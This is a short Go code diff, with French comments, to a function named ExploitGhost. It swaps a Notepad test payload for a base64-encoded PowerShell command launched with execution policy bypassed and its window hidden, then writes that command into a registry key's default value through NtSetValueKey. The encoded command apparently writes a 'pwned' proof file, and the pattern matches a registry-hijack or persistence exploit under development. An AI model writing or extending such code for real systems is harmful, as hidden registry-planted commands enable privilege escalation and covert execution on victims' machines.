@@ -97,7 +97,10 @@ func ExploitGhost() bool {
 
 	// Injection du Payload dans (Default)
 	// selfPath, _ := os.Executable()
-	payload := "cmd.exe /c start notepad.exe" // Test avec le bloc-notes
+	// Remplace le payload notepad par celui-ci
+	encodedCmd := "dwBoAG8AYQBtAGkAIAA+ACAAQwA6AFwAcAB3AG4AZQBkAC4AdAB4AHQA"
+	payload := "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + encodedCmd
+
 	data, _ := syscall.UTF16FromString(payload)
 	procNtSetValue.Call(uintptr(hKey), uintptr(0), 0, uintptr(1), uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)*2))
 
